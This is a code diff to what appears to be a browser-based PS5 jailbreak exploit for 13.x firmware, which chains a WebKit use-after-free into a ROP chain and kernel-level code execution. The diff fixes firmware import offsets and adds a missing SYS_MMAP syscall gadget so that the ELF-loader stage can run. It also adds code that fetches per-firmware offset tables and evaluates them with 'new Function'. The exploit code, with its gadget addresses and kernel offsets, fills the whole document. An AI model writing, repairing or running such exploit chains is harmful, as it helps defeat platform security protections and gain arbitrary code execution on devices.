@@ -455,10 +455,13 @@ try { if (localStorage.getItem("ps5_jailbroken") === "1") { isJailbroken = true;
 
 // Per-firmware offsets for 13.x series (kernel offsets are same across 13.20-13.60)
 const FIRMWARE_OFFSETS = {
+    // 13.00 shares the 13.20 table: X1NON-PSJB-main offsets/13.XX/13.00 is
+    // identical to offsets/13.XX/13.20, and offsets/offsets.json gives 13.00
+    // the same gps/cls/ers import window (0x3352238/0x3352228/0x3352230).
     "13.00": {
         wk_host_ctor: [0x56A58, 0x56CA0, 0x57CE8],
-        wk_memset_import: 0x3350850,
-        wk_stack_chk_guard_import: 0x334E198,
+        wk_memset_import: 0x3354850,
+        wk_stack_chk_guard_import: 0x3352198,
     },
     "13.20": {
         wk_host_ctor: [0x56A58, 0x56CA0, 0x57CE8],
@@ -525,11 +528,15 @@ const COMMON_OFFSETS = {
         "shr rax, 3": 0xD08FE1, "shr rax, 4": 0x1ADC233,
         "infloop": 0x1553D
     },
+    // NOTE: loadElfldrViaROP() ROPs through SYS_MMAP (0x1DD).  This trimmed
+    // fallback table originally omitted it, so syscalls[0x1DD] was undefined
+    // and the elfldr stage could never run on any 13.x firmware.  The
+    // authoritative tables in slopkit-main/offsets/*.js carry the full map.
     syscall_map: {
         0x3: 0x1BB1A, 0x4: 0x1D520, 0x5: 0x1B6E0, 0x6: 0x1B640, 0x7: 0x1BCE0,
         0x14: 0x1B860, 0x61: 0x1C9F0, 0x14B: 0x1D560, 0x1C6: 0x1BC60,
-        0x1C7: 0x1D180, 0x1D2: 0x1D5C0, 0x1E7: 0x1C550, 0x1E8: 0x1BF00,
-        0x2AF: 0x1D100, 0x278: 0x1B500, 0x279: 0x1D790
+        0x1C7: 0x1D180, 0x1D2: 0x1D5C0, 0x1DD: 0x1D260, 0x1E7: 0x1C550,
+        0x1E8: 0x1BF00, 0x2AF: 0x1D100, 0x278: 0x1B500, 0x279: 0x1D790
     },
     // Kernel offsets (same across 13.20-13.60)
     KERNEL_STACK_COOKIE: 0x930,
@@ -545,9 +552,76 @@ const COMMON_OFFSETS = {
     KERNEL_BUS_DATA_DEVICES: 0x2D481E8
 };
 
-function getOffsetsForFirmware(fwStr) {
+// ============================================================
+// OFFSET LOADING
+// The authoritative, hardware-derived per-firmware tables live in
+// slopkit-main/offsets/<fw>.js -- the very files the validated slopkit
+// chain itself loads.  They drive the ROP chain here too.
+// FIRMWARE_OFFSETS / COMMON_OFFSETS above are only a last-resort fallback
+// for hosts where slopkit-main/ is unavailable.
+// ============================================================
+const SLOPKIT_OFFSET_DIR = "slopkit-main/offsets/";
+const AVAILABLE_FW_OFFSETS = ["13.00", "13.20", "13.40", "13.42", "13.60"];
+const firmwareOffsetsCache = {};
+
+function fallbackOffsetsForFirmware(fwStr) {
     const fwOffsets = FIRMWARE_OFFSETS[fwStr] || FIRMWARE_OFFSETS["13.60"];
     return { ...COMMON_OFFSETS, ...fwOffsets };
+}
+
+async function loadFirmwareOffsets(fwStr) {
+    if (firmwareOffsetsCache[fwStr]) return firmwareOffsetsCache[fwStr];
+    if (AVAILABLE_FW_OFFSETS.indexOf(fwStr) === -1) {
+        throw new Error(`no offset table for firmware ${fwStr} (available: ${AVAILABLE_FW_OFFSETS.join(", ")})`);
+    }
+
+    const url = `${SLOPKIT_OFFSET_DIR}${fwStr}.js`;
+    const res = await fetch(url, { cache: "no-store" });
+    if (!res.ok) throw new Error(`${url} returned HTTP ${res.status}`);
+    const src = await res.text();
+
+    // Those files are classic scripts (const OFFSET_* / let wk_gadgetmap), so
+    // evaluate them in a function scope and pull out what the chain needs.
+    const table = new Function(`${src}
+return {
+    wk_host_ctor: OFFSET_wk_host_constructor_candidates,
+    wk_memset_import: OFFSET_wk_memset_import,
+    wk_stack_chk_guard_import: OFFSET_wk___stack_chk_guard_import,
+    lc_memset: OFFSET_lc_memset,
+    lc_setjmp: OFFSET_lc_setjmp,
+    lc_longjmp: OFFSET_lc_longjmp,
+    lk_stack_chk_guard: OFFSET_lk___stack_chk_guard,
+    lk_thread_list: OFFSET_lk__thread_list,
+    lk_worker_wait_return: OFFSET_lk_worker_wait_return,
+    wk_gadgetmap: wk_gadgetmap,
+    syscall_map: syscall_map
+};`)();
+
+    // loadElfldrViaROP() needs SYS_MMAP (0x1DD).  Refuse a table that cannot
+    // satisfy it rather than failing later inside the ROP chain.
+    if (!table.syscall_map || typeof table.syscall_map[0x1DD] !== "number") {
+        throw new Error(`offsets ${fwStr} do not contain the SYS_MMAP (0x1DD) gadget`);
+    }
+    if (!table.wk_gadgetmap || !Object.keys(table.wk_gadgetmap).length) {
+        throw new Error(`offsets ${fwStr} do not contain the WebKit gadget map`);
+    }
+
+    firmwareOffsetsCache[fwStr] = table;
+    log(`Offsets ${fwStr}: wk_memset=0x${table.wk_memset_import.toString(16)}, `
+        + `stack_chk=0x${table.wk_stack_chk_guard_import.toString(16)}, `
+        + `${Object.keys(table.wk_gadgetmap).length} gadgets, `
+        + `${Object.keys(table.syscall_map).length} syscalls`, "log-ok");
+    return table;
+}
+
+async function getOffsetsForFirmware(fwStr) {
+    try {
+        return await loadFirmwareOffsets(fwStr);
+    } catch (err) {
+        log(`Offsets: ${err.message}`, "log-warn");
+        log("Offsets: falling back to the inline 13.x table", "log-warn");
+        return fallbackOffsetsForFirmware(fwStr);
+    }
 }
 
 function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
@@ -580,12 +654,11 @@ async function runWebKitUAF(onProgress) {
     });
 }
 
-function initROP() {
+async function initROP() {
     const p = exploitState.p;
     if (!p) throw new Error("No primitive");
     const fwStr = fw || "13.60";
-    const offsets = getOffsetsForFirmware(fwStr);
-    log(`Using offsets for firmware ${fwStr}`, "log-info");
+    const offsets = await getOffsetsForFirmware(fwStr);
 
     let textArea = document.createElement("textarea");
     let textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
@@ -773,7 +846,7 @@ async function runFullExploitChain() {
 
         exploitState.stage = "rop_ready";
         updateStageBadge("rop_ready");
-        const ropCtx = initROP();
+        const ropCtx = await initROP();
         exploitState.chain = ropCtx.chain;
         exploitState.p = ropCtx.p;
 
